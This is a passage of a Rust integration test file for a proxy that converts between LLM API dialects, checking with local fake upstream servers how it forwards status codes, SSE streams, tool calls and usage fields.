    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    let _ = upstream_thread.join();
    assert!(
        resp.contains("200") && resp.contains("end_turn"),
        "proxy should return signed upstream Converse, got: {resp}"
    );
}

#[test]
fn proxy_forwards_upstream_sse_status() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        // Empty SSE is enough: remap must still forward 429, not rewrite to 200.
        let resp = "HTTP/1.1 429 Too Many Requests\r\nContent-Type: text/event-stream\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "sse-status.toml",
        &format!(
            r#"
schema_version = 1
id = "sse-status"
wire = "responses"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/responses"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "responses",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"test","input":"hi"}"#;
    let req = format!(
        "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.starts_with("HTTP/1.1 429") || resp.contains("429 Too Many Requests"),
        "SSE proxy must forward upstream status, got: {resp}"
    );
}

#[test]
fn proxy_forwards_sse_frames_before_upstream_closes() {
    let (go, wait) = std::sync::mpsc::sync_channel::<()>(0);
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let first = concat!(
            "HTTP/1.1 200 OK\r\n",
            "Content-Type: text/event-stream\r\n",
            "Connection: close\r\n\r\n",
            "data: {\"choices\":[{\"index\":0,\"delta\":{\"content\":\"hello\"}}]}\n\n",
        );
        let _ = stream.write_all(first.as_bytes());
        let _ = stream.flush();
        let _ = wait.recv_timeout(Duration::from_secs(5));
        let _ = stream.write_all(b"data: [DONE]\n\n");
        let _ = stream.flush();
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "sse-inc.toml",
        &format!(
            r#"
schema_version = 1
id = "sse-inc"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat-completions",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"grok-4","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_millis(200)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");

    let mut got = String::new();
    let mut buf = [0u8; 2048];
    let deadline = Instant::now() + Duration::from_secs(5);
    while Instant::now() < deadline && !got.contains("hello") {
        match client.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => got.push_str(&String::from_utf8_lossy(&buf[..n])),
            Err(err)
                if err.kind() == std::io::ErrorKind::WouldBlock
                    || err.kind() == std::io::ErrorKind::TimedOut => {}
            Err(err) => panic!("read first frame: {err}"),
        }
    }
    assert!(
        got.contains("hello"),
        "first SSE frame must arrive before upstream closes, got: {got}"
    );
    let _ = go.send(());

    while Instant::now() < deadline + Duration::from_secs(2) && !got.contains("[DONE]") {
        match client.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => got.push_str(&String::from_utf8_lossy(&buf[..n])),
            Err(err)
                if err.kind() == std::io::ErrorKind::WouldBlock
                    || err.kind() == std::io::ErrorKind::TimedOut => {}
            Err(err) => panic!("read rest: {err}"),
        }
    }
    let _ = child.kill();
    let _ = child.wait();
    let _ = upstream_thread.join();
    assert!(
        got.contains("[DONE]"),
        "stream must continue after the first frame, got: {got}"
    );
}

#[test]
fn proxy_same_dialect_sse_keeps_message_start() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = concat!(
            "event: message_start\n",
            "data: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-haiku\"}}\n\n",
            "event: content_block_delta\n",
            "data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"pong\"}}\n\n",
            "event: message_stop\n",
            "data: {\"type\":\"message_stop\"}\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "claude-sse.toml",
        &format!(
            r#"
schema_version = 1
id = "claude-sse"
wire = "messages"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/messages"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "messages",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"claude-haiku","max_tokens":16,"stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/messages HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("event: message_start"),
        "same-dialect SSE must keep message_start, got: {resp}"
    );
    assert!(
        resp.contains("pong"),
        "passthrough must keep assistant text, got: {resp}"
    );
}

#[test]
fn proxy_cross_dialect_sse_omits_message_start() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = concat!(
            "event: message_start\n",
            "data: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-haiku\"}}\n\n",
            "event: content_block_start\n",
            "data: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
            "event: content_block_delta\n",
            "data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"pong\"}}\n\n",
            "event: content_block_stop\n",
            "data: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
            "event: message_delta\n",
            "data: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"end_turn\",\"stop_sequence\":null},\"usage\":{\"output_tokens\":1}}\n\n",
            "event: message_stop\n",
            "data: {\"type\":\"message_stop\"}\n\n",
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "claude-cross-sse.toml",
        &format!(
            r#"
schema_version = 1
id = "claude-cross-sse"
wire = "messages"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/messages"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"model":"claude-haiku","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("pong"),
        "cross-dialect stream must remap assistant text, got: {resp}"
    );
    assert!(
        resp.contains("[DONE]"),
        "cross-dialect stream must end with Chat [DONE], got: {resp}"
    );
    assert!(
        !resp.contains("event: message_start")
            && !resp.contains("event: content_block_start")
            && !resp.contains("event: content_block_stop"),
        "Chat client must not see Messages event names, got: {resp}"
    );
}

#[test]
fn proxy_cross_dialect_json_maps_complete_body() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"msg_json","type":"message","role":"assistant","model":"claude-haiku","content":[{"type":"text","text":"pong"}],"stop_reason":"end_turn","usage":{"input_tokens":3,"output_tokens":1}}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "claude-cross-json.toml",
        &format!(
            r#"
schema_version = 1
id = "claude-cross-json"
wire = "messages"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/messages"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"model":"claude-haiku","stream":false,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("200") && resp.contains("pong") && resp.contains("choices"),
        "non-stream chat→messages must return a Chat completion, got: {resp}"
    );
    assert!(
        !resp.contains("not mapped"),
        "must not 501 a successful Messages JSON body, got: {resp}"
    );
}

#[test]
fn proxy_cross_dialect_messages_from_chat_json() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"choices":[{"message":{"role":"assistant","content":"pong"},"finish_reason":"stop"}],"usage":{"prompt_tokens":3,"completion_tokens":1}}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-cross-json.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-cross-json"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "messages",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"test","max_tokens":16,"stream":false,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/messages HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let looks_like_messages =
        resp.contains("\"type\":\"message\"") || resp.contains("\"type\":\"text\"");
    assert!(
        resp.contains("200") && resp.contains("pong") && looks_like_messages,
        "non-stream messages→chat must return a Messages body, got: {resp}"
    );
    assert!(
        !resp.contains("not mapped"),
        "must not 501 a successful Chat JSON body, got: {resp}"
    );
}

#[test]
fn proxy_cross_dialect_gemini_from_chat_json() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"choices":[{"message":{"role":"assistant","content":"pong"},"finish_reason":"stop"}],"usage":{"prompt_tokens":3,"completion_tokens":1}}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-cross-gemini.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-cross-gemini"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "gemini",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"contents":[{"role":"user","parts":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /v1beta/models/llama3.2:3b:generateContent HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let looks_like_gemini =
        resp.contains("\"finishReason\":\"STOP\"") || resp.contains("\"candidates\"");
    assert!(
        resp.contains("200") && resp.contains("pong") && looks_like_gemini,
        "non-stream gemini→chat must return a generateContent body, got: {resp}"
    );
    assert!(
        !resp.contains("not mapped"),
        "must not 501 a successful Chat JSON body, got: {resp}"
    );
}

#[test]
fn proxy_cross_dialect_responses_from_chat_json() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"choices":[{"message":{"role":"assistant","content":"pong"},"finish_reason":"stop"}],"usage":{"prompt_tokens":3,"completion_tokens":1}}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-cross-responses.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-cross-responses"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "responses",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"test","input":"hi"}"#;
    let req = format!(
        "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    let looks_like_responses =
        resp.contains("\"status\":\"completed\"") || resp.contains("output_text");
    assert!(
        resp.contains("200") && resp.contains("pong") && looks_like_responses,
        "non-stream responses→chat must return a Responses body, got: {resp}"
    );
    assert!(
        !resp.contains("not mapped"),
        "must not 501 a successful Chat JSON body, got: {resp}"
    );
}

#[test]
fn proxy_grok_stream_true_reaches_upstream_and_json_becomes_sse() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"stream\":true") || req.contains("\"stream\": true"),
            "upstream must see stream:true, got: {req}"
        );
        let body = r#"{"id":"chatcmpl-redacted","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"pong"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
        req.into_owned()
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "grok-ollama.toml",
        &format!(
            r#"
schema_version = 1
id = "grok-ollama"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat-completions",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"grok-4","stream":true,"messages":[{"role":"user","content":"ping"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    let _upstream_req = upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("text/event-stream"),
        "Grok always-SSE must get event-stream, not JSON, got: {resp}"
    );
    assert!(
        resp.contains("pong") && resp.contains("data:"),
        "wrapped SSE must carry assistant text, got: {resp}"
    );
}

#[test]
fn proxy_json_tool_completion_becomes_sse_tool_calls() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"chatcmpl-redacted","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"lookup","arguments":"{\"q\":\"x\"}"}}]},"finish_reason":"tool_calls"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "grok-tools.toml",
        &format!(
            r#"
schema_version = 1
id = "grok-tools"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat-completions",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"model":"grok-4","stream":true,"messages":[{"role":"user","content":"lookup"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("text/event-stream"),
        "tool JSON must wrap as SSE, got: {resp}"
    );
    assert!(
        resp.contains("lookup") && resp.contains("call_1"),
        "wrapped SSE must keep the tool call, got: {resp}"
    );
}

#[test]
fn proxy_messages_client_chat_json_text_and_tools_becomes_sse() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"chatcmpl-redacted","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"Let me look that up.","tool_calls":[{"id":"call_1","type":"function","function":{"name":"lookup","arguments":"{\"q\":\"x\"}"}}]},"finish_reason":"tool_calls"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "chat-up.toml",
        &format!(
            r#"
schema_version = 1
id = "chat-up"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "messages",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"claude","max_tokens":64,"stream":true,"messages":[{"role":"user","content":"lookup"}]}"#;
    let req = format!(
        "POST /v1/messages HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("text/event-stream"),
        "Messages client must get SSE, not JSON, got: {resp}"
    );
    assert!(
        resp.contains("Let me look that up."),
        "wrapped SSE must keep assistant text, got: {resp}"
    );
    assert!(
        resp.contains("tool_use") && resp.contains("lookup") && resp.contains("call_1"),
        "wrapped SSE must keep the tool_use block, got: {resp}"
    );
}

#[test]
fn proxy_json_completion_length_finish_and_usage_becomes_sse() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"chatcmpl-redacted","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"cut"},"finish_reason":"length"}],"usage":{"prompt_tokens":3,"completion_tokens":2,"total_tokens":5}}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "grok-length.toml",
        &format!(
            r#"
schema_version = 1
id = "grok-length"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat-completions",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"grok-4","stream":true,"messages":[{"role":"user","content":"ping"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("text/event-stream"),
        "JSON completion must wrap as SSE, got: {resp}"
    );
    assert!(
        resp.contains(r#""finish_reason":"length""#),
        "wrap must keep finish_reason length, not invent stop, got: {resp}"
    );
    assert!(
        !resp.contains(r#""finish_reason":"stop""#),
        "wrap must not invent stop when finish_reason is length, got: {resp}"
    );
    assert!(
        resp.contains(r#""prompt_tokens":3"#) && resp.contains(r#""completion_tokens":2"#),
        "wrap must forward Chat usage counts, got: {resp}"
    );
}

#[test]
fn proxy_json_completion_eos_finish_becomes_sse_stop() {
